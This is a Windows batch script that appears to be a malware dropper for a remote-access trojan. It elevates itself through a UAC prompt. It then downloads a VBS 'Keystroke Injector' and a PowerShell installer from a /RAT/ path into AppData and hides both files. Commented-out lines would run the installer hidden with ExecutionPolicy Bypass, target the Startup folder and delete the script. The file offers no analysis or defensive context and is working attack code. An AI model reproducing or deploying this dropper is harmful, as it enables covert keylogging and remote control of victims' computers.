@echo off
::---------------------------------------------------------------------------------------------------------------
::  --> Check for permissions
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
:: --> If error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt

    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\getadmin.vbs"
    "%temp%\getadmin.vbs"
    ::exit /B

:gotAdmin

    if exist "%temp%\getadmin.vbs" ( del "%temp%\getadmin.vbs" )
    pushd "%CD%"
    CD /D "%~dp0"

::----------------------------------------------------------------------------------------------------------------

timeout /t 1

SET currentDirectory=%cd%
SET TARGETDIR="C:\Users\%username%\AppData\Roaming\"
:: SET TargetLocToGetFile=C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
:: SET TargetFile="%currentDirectory%\module_downloader.cmd"

cd %TARGETDIR%

:: -----------------------------------------------------------cmd-------------------------------------------------------------------------

:: download Keystroke Injector
powershell "Invoke-WebRequest -Uri 'https://arth.imbeddex.com/RAT/hello.vbs' -OutFile payload.vbs"
attrib +h "payload.vbs"
:: payload.vbs

:: -------------------------------------------------------------------------------------------------------------------------------------
:: -----------------------------------------------------------ps1--------------------------------------------------------------------------

powershell "Invoke-WebRequest -Uri 'https://arth.imbeddex.com/RAT/installer.ps1' -OutFile installer.ps1"
attrib +h "installer.ps1"
::powershell -windowstyle hidden -ExecutionPolicy Bypass -File "%~dp0\installer.ps1"

:: -------------------------------------------------------------------------------------------------------------------------------------

cd %currentDirectory% 
:: cd %currentDirectory%
:: del module_downloader.cmd